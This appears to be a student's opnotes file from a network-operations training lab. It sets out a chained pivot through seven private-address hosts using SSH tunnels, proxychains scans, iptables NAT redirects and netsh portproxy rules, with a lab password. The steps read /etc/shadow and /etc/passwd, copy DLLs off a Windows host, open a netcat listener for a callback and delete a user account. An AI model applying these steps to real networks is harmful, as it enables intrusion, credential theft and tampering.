@@ -1,0 +1,115 @@
+Scheme of Maneuver:
+>T1: 10.50.28.223/ 192.168.0.99
+-> T2: 192.168.0.10
+--> T3: 192.168.0.23
+---> T4: 192.168.0.12
+----> T5: 192.168.0.9
+-----> T6: 192.168.0.13
+------> T7:  192.168.0.27
+
+kali -> T1
+ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@10.50.28.223 -p 22
+password4
+<notify MC of the connection>
+<start vetting>
+scan the network to determine the operating system of each live host
+kali:  
+ssh -S /tmp/T1 bad -O forward -D 9050
+proxychains nmap -Pn -sT 192.168.0.1-30 -p22,25,443 | grep open
+proxychains nc -nv 192.168.0.12 22
+proxychains nc -nv 192.168.0.23 22 
+<notify MC of the disconnect>
+
+T1 -> T2
+ssh -S /tmp/T1 bad -O forward -L 2222:192.168.0.10:22
+ssh -MS /tmp/T2 -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+<notify MC of the connection>
+<start vetting>
+perform a device survey
+<notify MC of the disconnect>
+
+T2 -> T3 .23
+ssh -S /tmp/T2 bad -O forward -L 3333:192.168.0.23:22
+ssh -MS /tmp/T3 -p 3333 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+<notify MC of the connection>
+<start vetting>
+collect the /etc/shadow and /etc/passwd files and redirect to the next target via IPTables rules.
+sudo md5sum /etc/shadow
+md5sum /etc/passwd
+lsmod
+sudo iptables -t nat -L
+cat /proc/sys/net/ipv4/ip_forward
+<confirm with MC>
+sudo sysctl -w net.ipv4.ip_forward=1
+sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+sudo iptables -t nat -A PREROUTING -p tcp --dport 22022 -j DNAT --to-destination 192.168.0.12:22
+sudo iptables -t nat -A PREROUTING -p tcp --dport 22023 -j DNAT --to-destination 192.168.0.12:22023
+sudo iptables -t nat -A PREROUTING -p tcp --dport 22024 -j DNAT --to-destination 192.168.0.12:22024
+sudo iptables -t nat -A POSTROUTING -p tcp -d 192.168.0.12 -j SNAT --to-source 192.168.0.23
+<undo>
+sudo iptables -t nat -D PREROUTING -p tcp --dport 22022 -j DNAT --to-destination 192.168.0.12:22
+sudo iptables -t nat -D PREROUTING -p tcp --dport 22023 -j DNAT --to-destination 192.168.0.12:22023
+sudo iptables -t nat -D PREROUTING -p tcp --dport 22024 -j DNAT --to-destination 192.168.0.12:22024
+sudo iptables -t nat -D POSTROUTING -p tcp -d 192.168.0.12 -j SNAT --to-source 192.168.0.23
+sudo sysctl -w net.ipv4.ip_forward=0
+<notify MC of the disconnect>
+
+T3 -> T4 .12
+ssh -S /tmp/T2 bad -O forward -L 4444:192.168.0.23:22022
+ssh -MS /tmp/T4 -p 4444 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+<notify MC of the connection>
+<start vetting>
+enumerate users and identify every application previously run on the target. Record results in your opnotes. Redirect to the next target using netsh tunnels.
+<portproxy>
+netsh interface portproxy show all
+netsh interface portproxy add v4tov4 listenport=22023 listenaddress=192.168.0.12 connectport=22 connectaddress=192.168.0.9 protocol=tcp
+netsh interface portproxy add v4tov4 listenport=22024 listenaddress=192.168.0.12 connectport=22024 connectaddress=192.168.0.9 protocol=tcp
+netsh interface portproxy delete v4tov4 listenport=22023 listenaddress=192.168.0.12
+netsh interface portproxy delete v4tov4 listenport=22024 listenaddress=192.168.0.12
+<disconnect>
+ 
+T4 -> T5 .9
+ssh -S /tmp/T2 bad -O forward -L 5555:192.168.0.23:22023
+ssh -MS /tmp/T5 -p 5555 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+<notify MC of the connection>
+<start vetting>
+perform an analyst survey, and collect all .dll files from C:\Program Files\Common Files\system\ado\, then redirect to the next target using netsh rules.
+Get-FileHash -Algorithm MD5 -Path (Get-ChildItem "C:\Program Files\Common Files\system\ado\*.*" -Recurse) -ErrorAction SilentlyContinue
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:'"C:/Program Files/Common Files/system/ado/*"' ~/Downloads/an_03-08-22_MM9/T5 
+<portproxy>
+netsh interface portproxy show all
+netsh interface portproxy add v4tov4 listenport=22024 listenaddress=192.168.0.9 connectport=22 connectaddress=192.168.0.13 protocol=tcp
+netsh interface portproxy delete v4tov4 listenport=22024 listenaddress=192.168.0.9
+<disconnect>
+
+T5 -> T6 .13
+ssh -S /tmp/T2 bad -O forward -L 6666:192.168.0.23:22024
+ssh -MS /tmp/T6 -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+<vetting>
+Action: Perform SSH masquerade, survey, collect /etc/passwd, /etc/shadow, and /etc/group, and redirect to the next target using ssh tunnels. Catch the callback beacon from T5 and report it to the analyst.
+md5sum /etc/passwd
+sudo md5sum /etc/shadow
+cat /etc/group
+md5sum /etc/group
+
+On kali:
+ssh -S /tmp/T6 bad -O forward -R 192.168.0.13:12304:localhost:12304
+nc -l 12304
+
+T6 -> T7
+ssh -S /tmp/T6 bad -O forward -L 7777:192.168.0.27:22
+ssh -MS /tmp/T7 -p 7777 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+<vetting>
+Action: Perform SSH masquerade and survey. Execute T10 effect and delete user account student#+1 as outlined in Prior Approvals section. Conclude operation.
+sudo userdel student5
+###timestamp effects!!!###
+cat /etc/passwd
+<disconnect procedure>
+
+
